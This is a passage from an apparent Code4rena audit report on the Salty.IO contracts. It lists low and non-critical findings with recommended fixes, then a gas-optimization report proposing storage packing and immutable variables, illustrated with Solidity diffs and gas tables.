1/3 to 2/3 of arbitrage profit may not be distributed

### Proof of Concept

Arbitrage profit is always divided by 3, despite some indicies might have an `INVALID_POOL_ID`. That means if an index has an invalid pool id, that 33% of arbitrage profits will not be distributed.

```solidity
    // Split the arbitrage profit between all the pools that contributed to generating the arbitrage for the referenced pool.
👉  uint256 arbitrageProfit = _arbitrageProfits[poolID] / 3;
    if ( arbitrageProfit > 0 )
        {
        ArbitrageIndicies memory indicies = _arbitrageIndicies[poolID];

        if ( indicies.index1 != INVALID_POOL_ID )
👉          _calculatedProfits[indicies.index1] += arbitrageProfit;

        if ( indicies.index2 != INVALID_POOL_ID )
👉          _calculatedProfits[indicies.index2] += arbitrageProfit;

        if ( indicies.index3 != INVALID_POOL_ID )
👉          _calculatedProfits[indicies.index3] += arbitrageProfit;
        }
    }
```

[PoolStats.sol#L111-L126](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolStats.sol#L111-L126)

### Recommendation

Count the number of indicies without an `INVALID_POOL_ID`, and then distribute the profit evenly among them

## [L-11] - Users from excluded countries, without wallet authorization can call `cancelUnstake()`

There is no restriction in [`cancelUnstake()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Staking.sol#L84-L97) to prevent wallets without access to call the function, like in [`stakeSALT()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Staking.sol#L43).

Canceling the unstake process puts back the staked SALT in the contract, like with the staking process.

### Recommendation

Consider not allowing unauthorized users to cancel their unstake process.

```diff
    function cancelUnstake( uint256 unstakeID ) external nonReentrant
+       require( exchangeConfig.walletHasAccess(msg.sender), "Sender does not have exchange access" );
```

## Non-Critical Severity Findings

## [N-01] - `tokenIconURL` is not used in `proposeTokenUnwhitelisting()`

[`tokenIconURL`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L180) is only used when whitelisting tokens but not when [unwhitelisting](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L157-L164).

### Recommendation

Consider removing it from `proposeTokenUnwhitelisting()`

## [N-02] - `sum` in `RewardsEmitter` is not used

The [`sum`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/rewards/RewardsEmitter.sol#L115) variable is [calculated](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/rewards/RewardsEmitter.sol#L128) in the `RewardsEmitter` but never used, nor returned.

It may have been left from a previous refactor, as a `sum` variable [is also used in `StakingRewards::addSALTRewards()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L201-L204), which is called by the `RewardsEmitter`.

The `RewardsEmitter` already [approved the SALT token to its maximum](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/rewards/RewardsEmitter.sol#L50), so there should be no issue. On any case, I'm highlighting this, as it may hide some other issue I couldn't detect.

### Recommendation

Verify that `sum` is actually not used, and remove it from the `RewardsEmitter` contract if not.

## [N-03] - Replace `==` balance comparison with `>=`

Even if the initial distribution is supposed to have an exact number of tokens, it is safer to check that the [function to distribute them](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/launch/InitialDistribution.sol#L50) won't revert if for any reason it has more tokens, which would lock them in the contract:

```diff
-   require( salt.balanceOf(address(this)) == 100 * MILLION_ETHER, "SALT has already been sent from the contract" );
+   require( salt.balanceOf(address(this)) >= 100 * MILLION_ETHER, "SALT has already been sent from the contract" );
```

[InitialDistribution.sol#L53](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/launch/InitialDistribution.sol#L53)

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/638#issuecomment-1947934095):**
 > ManagedWallet has been removed.
> 
> https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5

 > N-02 (Was L-14) fixed: https://github.com/othernet-global/salty-io/commit/7d61857dd021ac4c549d062a49c83629c2d7d741

 > L-1: fixed in https://github.com/othernet-global/salty-io/commit/c27620a6ac8209cd45788096927c1e273aa9c36e

 > L-2: fixed https://github.com/othernet-global/salty-io/commit/e0555c5a53b3675a7eb693633a52cf6e2c601496

 > L-4: parameterType now validated, https://github.com/othernet-global/salty-io/commit/524b59900013d90d17db2b34263c4973a866ab38

***

# Gas Optimizations

For this audit, 20 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-01-salty-findings/issues/889) by **0xVolcano** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2024-01-salty-findings/issues/1031), [0xAnah](https://github.com/code-423n4/2024-01-salty-findings/issues/1015), [dharma09](https://github.com/code-423n4/2024-01-salty-findings/issues/584), [lsaudit](https://github.com/code-423n4/2024-01-salty-findings/issues/398), [K42](https://github.com/code-423n4/2024-01-salty-findings/issues/269), [hunter\_w3b](https://github.com/code-423n4/2024-01-salty-findings/issues/1013), [naman1778](https://github.com/code-423n4/2024-01-salty-findings/issues/1002), [JCK](https://github.com/code-423n4/2024-01-salty-findings/issues/994), [unique](https://github.com/code-423n4/2024-01-salty-findings/issues/976), [sivanesh\_808](https://github.com/code-423n4/2024-01-salty-findings/issues/915), [slvDev](https://github.com/code-423n4/2024-01-salty-findings/issues/842), [Raihan](https://github.com/code-423n4/2024-01-salty-findings/issues/807), [niroh](https://github.com/code-423n4/2024-01-salty-findings/issues/790), [n0kto](https://github.com/code-423n4/2024-01-salty-findings/issues/557), [Rolezn](https://github.com/code-423n4/2024-01-salty-findings/issues/405), [JcFichtner](https://github.com/code-423n4/2024-01-salty-findings/issues/251), [Kaysoft](https://github.com/code-423n4/2024-01-salty-findings/issues/180), [Pechenite](https://github.com/code-423n4/2024-01-salty-findings/issues/92), and [Beepidibop](https://github.com/code-423n4/2024-01-salty-findings/issues/7).*

## Table of contents

- [Gas report](#gas-report)
  - [Table of contents](#table-of-contents)
    - [In accordance to the sponsors requirements, this report only focuses on issues that save more than 100 Gas](#in-accordance-to-the-sponsors-requirements-this-report-only-focuses-on-issues-that-save-more-than-100-gas)
  - [Pack `lastUpkeepTimeEmissions` and `lastUpkeepTimeRewardsEmitters` together by reducing their size to `uint128` (Saves 1 SLOT: 2.1K Gas)](#pack-lastupkeeptimeemissions-and-lastupkeeptimerewardsemitters-together-by-reducing-their-size-to-uint128-saves-1-slot-21k-gas)
  - [Pack the following by reducing their size(Save 3 SLOTS: 6.3K Gas)](#pack-the-following-by-reducing-their-sizesave-3-slots-63k-gas)
  - [Pack `minUnstakeWeeks,maxUnstakeWeeks,minUnstakePercent` by reducing the sizes(Save 2 SLOTs: 4.2K Gas)](#pack-minunstakeweeksmaxunstakeweeksminunstakepercent-by-reducing-the-sizessave-2-slots-42k-gas)
  - [Pack `rewardPercentForCallingLiquidation` with `maxRewardValueForCallingLiquidation`  by reducing the size(Save 1 SLOT: 2.1K Gas)](#pack-rewardpercentforcallingliquidation-with-maxrewardvalueforcallingliquidation--by-reducing-the-sizesave-1-slot-21k-gas)
  - [Pack `minimumCollateralValueForBorrowing` with `initialCollateralRatioPercent`(Save 1 SLOT: 2.1K Gas)](#pack-minimumcollateralvalueforborrowing-with-initialcollateralratiopercentsave-1-slot-21k-gas)
  - [Declare immutables for `exchangeConfig.wbtc()` and `exchangeConfig.weth()`(Save 2351 Gas on average)](#declare-immutables-for-exchangeconfigwbtc-and-exchangeconfigwethsave-2351-gas-on-average)
  - [Reference the immutable variable `salt` instead of making the external call again(Save 546 Gas on average)](#reference-the-immutable-variable-salt-instead-of-making-the-external-call-againsave-546-gas-on-average)
  - [Use the already defined immutable variable(save 595 Gas on average)](#use-the-already-defined-immutable-variablesave-595-gas-on-average)
  - [Use the imutable variable defined in the constructor instead of calling the external function again( Save 110 Gas)](#use-the-imutable-variable-defined-in-the-constructor-instead-of-calling-the-external-function-again-save-110-gas)
  - [Define immutable variables for `wbtc` and `weth`(Save 253 Gas on average)](#define-immutable-variables-for-wbtc-and-wethsave-253-gas-on-average)
  - [Immutable variable already defined(Save 327 Gas on average)](#immutable-variable-already-definedsave-327-gas-on-average)
  - [Expensive operation inside a for loop(Save 640 Gas on average)](#expensive-operation-inside-a-for-loopsave-640-gas-on-average)
  - [Avoid making unnecessary external calls(Save 4285 Gas on average)](#avoid-making-unnecessary-external-callssave-4285-gas-on-average)
  - [Refactor the code to avoid unnecessary external calls(Save 1300 Gas on average)](#refactor-the-code-to-avoid-unnecessary-external-callssave-1300-gas-on-average)
  - [We should cache the result of a function instead of calling it twice(Save 178 Gas on average )](#we-should-cache-the-result-of-a-function-instead-of-calling-it-twicesave-178-gas-on-average-)
  - [Avoid reading state variables due to how the logic is executed(Save 1 SLOAD: 100 Gas)](#avoid-reading-state-variables-due-to-how-the-logic-is-executedsave-1-sload-100-gas)
  - [Prioritize validating cheap variables first](#prioritize-validating-cheap-variables-first)
    - [Cheaper to validate `block.timestamp >= completionTimestamp` first](#cheaper-to-validate-blocktimestamp--completiontimestamp-first)
    - [Validate `liquidityToRemove` before reading from state](#validate-liquiditytoremove-before-reading-from-state)
    - [Validate the function parameters before making the state reads](#validate-the-function-parameters-before-making-the-state-reads)
    - [Validate the function parameter first before making any state reads](#validate-the-function-parameter-first-before-making-any-state-reads)
    - [Validate `amountRepaid` before making any state read](#validate-amountrepaid-before-making-any-state-read)
    - [Refactor function to only make state assignments after parameter verification](#refactor-function-to-only-make-state-assignments-after-parameter-verification)


### In accordance to the sponsors requirements, this report only focuses on issues that save more than 100 Gas

**Note: The issues addressed here were not reported by the bot, for packing variables, notes explaining the how and why are included**

**Gas estimates are given by running included tests ``COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url http://x.x.x.x:yyy --gas-report`` but for packing issues, we can simply calculate from the number of SLOTs saved**

## Pack `lastUpkeepTimeEmissions` and `lastUpkeepTimeRewardsEmitters` together by reducing their size to `uint128` (Saves 1 SLOT: 2.1K Gas)
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/Upkeep.sol#L63-L64
```solidity
File: /src/Upkeep.sol
63:        uint256 public lastUpkeepTimeEmissions;
64:        uint256 public lastUpkeepTimeRewardsEmitters;
```
Since this are timestamps, we can reduce the size to something like `uint128` and should still be big enough. We can see the evidence of them being timestamps in how they are assigned:

```solidity
86:                lastUpkeepTimeEmissions = block.timestamp;
87:                lastUpkeepTimeRewardsEmitters = block.timestamp;
```

Reducing the size will save us one storage slot:

```diff
diff --git a/src/Upkeep.sol b/src/Upkeep.sol
index 7587bde..407850a 100644
--- a/src/Upkeep.sol
+++ b/src/Upkeep.sol
@@ -60,8 +60,8 @@ contract Upkeep is IUpkeep, ReentrancyGuard
        IUSDS  immutable public usds;
        IERC20  immutable public dai;

-       uint256 public lastUpkeepTimeEmissions;
-       uint256 public lastUpkeepTimeRewardsEmitters;
+       uint128 public lastUpkeepTimeEmissions;
+       uint128 public lastUpkeepTimeRewardsEmitters;

```

## Pack the following by reducing their size(Save 3 SLOTS: 6.3K Gas)
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L21-L34
```solidity
File: /src/price_feed/PriceAggregator.sol
21:        IPriceFeed public priceFeed3; // CoreSaltyFeed by default

23:        // The next time at which setPriceFeed can be called
24:        uint256 public priceFeedModificationCooldownExpiration;

28:        // Range: 1% to 7% with an adjustment of .50%
29:        uint256 public maximumPriceFeedPercentDifferenceTimes1000 = 3000; // Defaults to 3.0% with a 1000x multiplier

33:        // Range: 30 to 45 days with an adjustment of 5 days
34:        uint256 public priceFeedModificationCooldown = 35 days;
```

Since `priceFeedModificationCooldownExpiration` is a timestamp, we can reduce it's size to `uint48` which should be safe enough.
`maximumPriceFeedPercentDifferenceTimes1000` has a defined range with the max bound being `7000` therefore `uint32` can fit the max value
`priceFeedModificationCooldown` also has some ranges defined with the max value being 45 days we can therefore use `uint16` or even `uint8`

Note, all the bounds are enforced whenever we alter the variables , eg https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L65-L79:

```solidity
        function changeMaximumPriceFeedPercentDifferenceTimes1000(bool increase) public onlyOwner
                {
        if (increase)
            {
            if (maximumPriceFeedPercentDifferenceTimes1000 < 7000)
                maximumPriceFeedPercentDifferenceTimes1000 += 500;
            }
        else
            {
            if (maximumPriceFeedPercentDifferenceTimes1000 > 1000)
                maximumPriceFeedPercentDifferenceTimes1000 -= 500;
            }

```

Note, the value would only be incremented if we are currently less than 7000, which ensures that we never go above the 7000 bound.

The same enforcement is done for `priceFeedModificationCooldown` here https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L82-L96.

We choose to pack with the address `priceFeed3` as they are all accessed within the same transaction:

```diff
diff --git a/src/price_feed/PriceAggregator.sol b/src/price_feed/PriceAggregator.sol
index ab23f29..c987c0a 100644
--- a/src/price_feed/PriceAggregator.sol
+++ b/src/price_feed/PriceAggregator.sol
@@ -18,20 +18,20 @@ contract PriceAggregator is IPriceAggregator, Ownable

        IPriceFeed public priceFeed1; // CoreUniswapFeed by default
        IPriceFeed public priceFeed2; // CoreChainlinkFeed by default
-       IPriceFeed public priceFeed3; // CoreSaltyFeed by default
+       IPriceFeed public priceFeed3; // CoreSaltyFeed by default //@audit 20

        // The next time at which setPriceFeed can be called
-       uint256 public priceFeedModificationCooldownExpiration;
+       uint48 public priceFeedModificationCooldownExpiration;//@audit timestamp

        // The maximum percent difference between two non-zero PriceFeed prices when aggregating price.
        // When the two closest PriceFeeds (out of the three) have prices further apart than this the aggregated price is considered invalid.
        // Range: 1% to 7% with an adjustment of .50%
-       uint256 public maximumPriceFeedPercentDifferenceTimes1000 = 3000; // Defaults to 3.0% with a 1000x multiplier
+       uint32 public maximumPriceFeedPercentDifferenceTimes1000 = 3000; // Defaults to 3.0% with a 1000x multiplier //@audit max = 7k

        // The required cooldown between calls to setPriceFeed.
        // Allows time to evaluate the performance of the recently updatef PriceFeed before further updates are made.
        // Range: 30 to 45 days with an adjustment of 5 days
-       uint256 public priceFeedModificationCooldown = 35 days;
+       uint16 public priceFeedModificationCooldown = 35 days; //@audit max 45
```

## Pack `minUnstakeWeeks,maxUnstakeWeeks,minUnstakePercent` by reducing the sizes(Save 2 SLOTs: 4.2K Gas)
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingConfig.sol#L18-L26
```solidity
File: /src/staking/StakingConfig.sol
17:        // Range: 1 to 12 with an adjustment of 1
18:        uint256 public minUnstakeWeeks = 2;  // minUnstakePercent returned for unstaking this number of weeks

21:        // Range: 20 to 108 with an adjustment of 8
22:        uint256 public maxUnstakeWeeks = 52;

25:        // Range: 10 to 50 with an adjustment of 5
26:        uint256 public minUnstakePercent = 20;
```

We can reduce the size of the the variables above to `uint64` . This should be safe as the variables have some Ranges already defined.

For `minUnstakeWeeks` the max the value can get is 12 and this is also enforced on the function `changeMinUnstakeWeeks`
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingConfig.sol#L34-L48
```solidity
        function changeMinUnstakeWeeks(bool increase) external onlyOwner
        {
        if (increase)
            {
            if (minUnstakeWeeks < 12)
                minUnstakeWeeks += 1;
            }
        else
            {
            if (minUnstakeWeeks > 1)
                minUnstakeWeeks -= 1;
            }

                emit MinUnstakeWeeksChanged(minUnstakeWeeks);
        }
```
Note, the value is only incremented if it's less than 12.

The other variables also have defined bounds , for `maxUnstakeWeeks` the biggest we can get is `108` while for `minUnstakePercent` the range is defined as `10` to `50`:

```diff
diff --git a/src/staking/StakingConfig.sol b/src/staking/StakingConfig.sol
index 33b77d9..d94d08a 100644
--- a/src/staking/StakingConfig.sol
+++ b/src/staking/StakingConfig.sol
@@ -15,15 +15,15 @@ contract StakingConfig is IStakingConfig, Ownable

     // The minimum number of weeks for an unstake request at which point minUnstakePercent of the original staked SALT is reclaimable.
        // Range: 1 to 12 with an adjustment of 1
-       uint256 public minUnstakeWeeks = 2;  // minUnstakePercent returned for unstaking this number of weeks
+       uint64 public minUnstakeWeeks = 2;  // minUnstakePercent returned for unstaking this number of weeks

        // The maximum number of weeks for an unstake request at which point 100% of the original staked SALT is reclaimable.
        // Range: 20 to 108 with an adjustment of 8
-       uint256 public maxUnstakeWeeks = 52;
+       uint64 public maxUnstakeWeeks = 52;//@audit (Always bound between 20 -108)

        // The percentage of the original staked SALT that is reclaimable when unstaking the minimum number of weeks.
        // Range: 10 to 50 with an adjustment of 5
-       uint256 public minUnstakePercent = 20;
+       uint64 public minUnstakePercent = 20;
```

The reason we pack this variables together is because they are accessed in the same transaction shown below
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Staking.sol#L198-L212:

```solidity
        function calculateUnstake( uint256 unstakedXSALT, uint256 numWeeks ) public view returns (uint256)
                {
                uint256 minUnstakeWeeks = stakingConfig.minUnstakeWeeks();
        uint256 maxUnstakeWeeks = stakingConfig.maxUnstakeWeeks();
        uint256 minUnstakePercent = stakingConfig.minUnstakePercent();

                require( numWeeks >= minUnstakeWeeks, "Unstaking duration too short" );
                require(numWeeks <= maxUnstakeWeeks,"Unstaking duration too long");

                uint256 percentAboveMinimum = 100 - minUnstakePercent;
                uint256 unstakeRange = maxUnstakeWeeks - minUnstakeWeeks;

                uint256 numerator = unstakedXSALT * ( minUnstakePercent * unstakeRange + percentAboveMinimum * ( numWeeks - minUnstakeWeeks ) );
        return numerator / ( 100 * unstakeRange );
                }
```

## Pack `rewardPercentForCallingLiquidation` with `maxRewardValueForCallingLiquidation`  by reducing the size(Save 1 SLOT: 2.1K Gas)
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/StableConfig.sol#L19-L24
```solidity
File: /src/stable/StableConfig.sol
19:        // Range: 5 to 10 with an adjustment of 1
20:    uint256 public rewardPercentForCallingLiquidation = 5;

23:        // Range: 100 to 1000 with an adjustment of 100 ether
24:    uint256 public maxRewardValueForCallingLiquidation = 500 ether;
```

Since the above two are accessed in the same transaction here https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L157-L164:

```solididity
                uint256 rewardPercent = stableConfig.rewardPercentForCallingLiquidation();


                uint256 rewardedWBTC = (reclaimedWBTC * rewardPercent) / 100;
                uint256 rewardedWETH = (reclaimedWETH * rewardPercent) / 100;


                // Make sure the value of the rewardAmount is not excessive
                uint256 rewardValue = underlyingTokenValueInUSD( rewardedWBTC, rewardedWETH ); // in 18 decimals
                uint256 maxRewardValue = stableConfig.maxRewardValueForCallingLiquidation(); // 18 decimals
```

We can reduce the size from `uint256` to `uint128` and pack them together.

`uint128` should be big enough since this variables are bound and have defined ranges that are enforced whenever we assign values to them. eg Whenever we intend to increment the value of `rewardPercentForCallingLiquidation` we make sure the current value is less than `10` which means we will never go above 10.

For `maxRewardValueForCallingLiquidation` the max value we can ever get is defined as `1000`.

From the defined bounds `uint128` should be big enough:

```diff
diff --git a/src/stable/StableConfig.sol b/src/stable/StableConfig.sol
index 8d6f5de..637833a 100644
--- a/src/stable/StableConfig.sol
+++ b/src/stable/StableConfig.sol
@@ -17,21 +17,21 @@ contract StableConfig is IStableConfig, Ownable

        // The reward (in collateraLP) that a user receives for instigating the liquidation process - as a percentage of the amount of collateralLP that is liquidated.
        // Range: 5 to 10 with an adjustment of 1
-    uint256 public rewardPercentForCallingLiquidation = 5;
+    uint128 public rewardPercentForCallingLiquidation = 5;

        // The maximum reward value (in USD) that a user receives for instigating the liquidation process.
        // Range: 100 to 1000 with an adjustment of 100 ether
-    uint256 public maxRewardValueForCallingLiquidation = 500 ether;
+    uint128 public maxRewardValueForCallingLiquidation = 500 ether;//@audit pack this and above
```

## Pack `minimumCollateralValueForBorrowing` with `initialCollateralRatioPercent`(Save 1 SLOT: 2.1K Gas)
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/StableConfig.sol#L28-L34
```solidity
File: /src/stable/StableConfig.sol
28:        // Range: 1000 to 5000 with an adjustment of 500 ether
29:    uint256 public minimumCollateralValueForBorrowing = 2500 ether;

33:    // Range: 150 to 300 with an adjustment of 25
34:    uint256 public initialCollateralRatioPercent = 200;

38:        // Range: 110 to 120 with an adjustment of 1
39:        uint256 public minimumCollateralRatioPercent = 110;
```

The defined ranges can well fit in `uint128` and pack this together. The two are accessed in the same transaction thus we can benefit from packing them:

```diff
        // Range: 1000 to 5000 with an adjustment of 500 ether
-    uint256 public minimumCollateralValueForBorrowing = 2500 ether;
+    uint128 public minimumCollateralValueForBorrowing = 2500 ether;

     // the initial maximum collateral / borrowed USDS ratio.
     // Defaults to 2.0x so that staking $1000 worth of BTC/ETH LP would allow you to borrow $500 of USDS
     // Range: 150 to 300 with an adjustment of 25
-    uint256 public initialCollateralRatioPercent = 200;
+    uint128 public initialCollateralRatioPercent = 200;
```


## Declare immutables for `exchangeConfig.wbtc()` and `exchangeConfig.weth()`(Save 2351 Gas on average)

|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 10259 | 126914   | 13406  | 382471 
| After  | 7636 | 124563   | 12095  | 379848 
|        |      |         |        |       

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L180-L191

```solidity
File: /src/dao/Proposals.sol
180:        function proposeTokenUnwhitelisting( IERC20 token, string calldata tokenIconURL, string calldata description ) external nonReentrant returns (uint256 ballotID)
181:                {
182:                require( poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), "Can only unwhitelist a whitelisted token" );
183:                require( address(token) != address(exchangeConfig.wbtc()), "Cannot unwhitelist WBTC" );
184:                require( address(token) != address(exchangeConfig.weth()), "Cannot unwhitelist WETH" );
```

```diff
diff --git a/src/dao/Proposals.sol b/src/dao/Proposals.sol
index 40ebd17..e66fadc 100644
--- a/src/dao/Proposals.sol
+++ b/src/dao/Proposals.sol
@@ -32,6 +32,8 @@ contract Proposals is IProposals, ReentrancyGuard
     IPoolsConfig immutable public poolsConfig;
     IDAOConfig immutable public daoConfig;
     ISalt immutable public salt;
+       IERC20 immutable public wbtc;
+       IERC20 immutable public weth;

        // Mapping from ballotName to a currently open ballotID (zero if none).
        // Used to check for existing ballots by name so as to not allow duplicate ballots to be created.
@@ -75,6 +77,8 @@ contract Proposals is IProposals, ReentrancyGuard
                daoConfig = _daoConfig;

                salt = exchangeConfig.salt();
+               wbtc = exchangeConfig.wbtc();
+               weth = exchangeConfig.weth();
         }


@@ -180,8 +184,8 @@ contract Proposals is IProposals, ReentrancyGuard
        function proposeTokenUnwhitelisting( IERC20 token, string calldata tokenIconURL, string calldata description ) external nonReentrant returns (uint256 ballotID)
                {
                require( poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), "Can only unwhitelist a whitelisted token" );
-               require( address(token) != address(exchangeConfig.wbtc()), "Cannot unwhitelist WBTC" );
-               require( address(token) != address(exchangeConfig.weth()), "Cannot unwhitelist WETH" );
+               require( address(token) != address(wbtc), "Cannot unwhitelist WBTC" );
+               require( address(token) != address(weth), "Cannot unwhitelist WETH" );
                require( address(token) != address(exchangeConfig.dai()), "Cannot unwhitelist DAI" );
                require( address(token) != address(exchangeConfig.usds()), "Cannot unwhitelist USDS" );
                require( address(token) != address(exchangeConfig.salt()), "Cannot unwhitelist SALT" );
```

## Reference the immutable variable `salt` instead of making the external call again(Save 546 Gas on average)
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 5767 | 165956   | 167908  | 322904 |
| After  | 5767 | 165410   | 167253  | 322248 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L196-L209
```solidity
File: /src/dao/Proposals.sol
196:        function proposeSendSALT( address wallet, uint256 amount, string calldata description ) external nonReentrant returns (uint256 ballotID)
197:                {
198:                require( wallet != address(0), "Cannot send SALT to address(0)" );

201:                uint256 balance = exchangeConfig.salt().balanceOf( address(exchangeConfig.dao()) );
202:                uint256 maxSendable = balance * 5 / 100;
203:                require( amount <= maxSendable, "Cannot send more than 5% of the DAO SALT balance" );

207:                string memory ballotName = "sendSALT";
208:                return _possiblyCreateProposal( ballotName, BallotType.SEND_SALT, wallet, amount, "", description );
209:                }
```

We are making an external call `exchangeConfig.salt` but this call is already declared as an immutable variable and we should therefore reference the immutable variable `salt` instead.


```diff
diff --git a/src/dao/Proposals.sol b/src/dao/Proposals.sol
index 40ebd17..b7e4b00 100644
--- a/src/dao/Proposals.sol
+++ b/src/dao/Proposals.sol
@@ -198,7 +200,7 @@ contract Proposals is IProposals, ReentrancyGuard
                require( wallet != address(0), "Cannot send SALT to address(0)" );

                // Limit to 5% of current balance
-               uint256 balance = exchangeConfig.salt().balanceOf( address(exchangeConfig.dao()) );
+               uint256 balance = salt.balanceOf( address(dao) );
                uint256 maxSendable = balance * 5 / 100;
                require( amount <= maxSendable, "Cannot send more than 5% of the DAO SALT balance" );

```

## Use the already defined immutable variable(save 595 Gas on average)
|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 1391 | 4323   | 3987  | 10399 |
| After  | 1391 | 3728   | 3332  | 9744 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L317-L334

```solidity
File: /src/dao/Proposals.sol
317:        function requiredQuorumForBallotType( BallotType ballotType ) public view returns (uint256 requiredQuorum)
318:                {

334:                uint256 totalSupply = ERC20(address(exchangeConfig.salt())).totalSupply();
```
In the constructor, we have an immutable variable `salt` whose value is `exchangeConfig.salt()`

```diff
-               uint256 totalSupply = ERC20(address(exchangeConfig.salt())).totalSupply();
+               uint256 totalSupply = ERC20(address(salt)).totalSupply();
                uint256 minimumQuorum = totalSupply * 5 / 1000;
```

## Use the imutable variable defined in the constructor instead of calling the external function again( Save 110 Gas)
**Gas benchmarks based on function `finalizeBallot()`

|        | Min  | Average | Median | Max   |
| ------ | ---- | ------- | ------ | ----- |
| Before | 7296 | 85003   | 50499  | 520797 |
| After  | 7296 | 84993   | 50499  | 520797 |
|        |      |         |        |       |

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L166-L176
```solidity
File: /src/dao/DAO.sol
166:                else if ( ballot.ballotType == BallotType.SEND_SALT )
167:                        {

170:                        if ( exchangeConfig.salt().balanceOf(address(this)) >= ballot.number1 )
171:                                {
172:                                IERC20(exchangeConfig.salt()).safeTransfer( ballot.address1, ballot.number1 );


174:                                emit SaltSent(ballot.address1, ballot.number1);
175:                                }
176:                        }
```

In this block, we are calling `exchangeConfig.salt()` two times. This is an external call and thus can be quite expensive. 
If we take a look at the constructor, we can see we already have this call defined in a variable `salt` 
`salt = exchangeConfig.salt();`
Instead of making the call again, we should just reference the variable `salt`.


```diff
@@ -167,9 +167,9 @@ contract DAO is IDAO, Parameters, ReentrancyGuard
                        {
                        // Make sure the contract has the SALT balance before trying to send it.
                        // This should not happen but is here just in case - to prevent approved proposals from reverting on finalization.
-                       if ( exchangeConfig.salt().balanceOf(address(this)) >= ballot.number1 )
+                       if ( salt.balanceOf(address(this)) >= ballot.number1 )
                                {
-                               IERC20(exchangeConfig.salt()).safeTransfer( ballot.address1, ballot.number1 );
+                               IERC20(salt).safeTransfer( ballot.address1, ballot.number1 );

                                emit SaltSent(ballot.address1, ballot.number1);
                                }
```


**Similar instance**
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L246-L265
```solidity
File: /src/dao/DAO.sol
246:                        uint256 saltBalance = exchangeConfig.salt().balanceOf( address(this) );
247:                        require( saltBalance >= bootstrappingRewards * 2, "Whitelisting is not currently possible due to insufficient bootstrapping rewards" );


265:                        exchangeConfig.salt().approve( address(liquidityRewardsEmitter), bootstrappingRewards * 2 );
```


```diff
diff --git a/src/dao/DAO.sol b/src/dao/DAO.sol
index 3275f83..c6d8878 100644
--- a/src/dao/DAO.sol
+++ b/src/dao/DAO.sol
@@ -243,7 +243,7 @@ contract DAO is IDAO, Parameters, ReentrancyGuard

                        // Make sure that the DAO contract holds the required amount of SALT for bootstrappingRewards.
                        // Twice the bootstrapping rewards are needed (for both the token/WBTC and token/WETH pools)
-                       uint256 saltBalance = exchangeConfig.salt().balanceOf( address(this) );
+                       uint256 saltBalance = salt.balanceOf( address(this) );
                        require( saltBalance >= bootstrappingRewards * 2, "Whitelisting is not currently possible due to insufficient bootstrapping rewards" );

                        // Fail to whitelist for now if this isn't the whitelisting proposal with the most votes - can try again later.
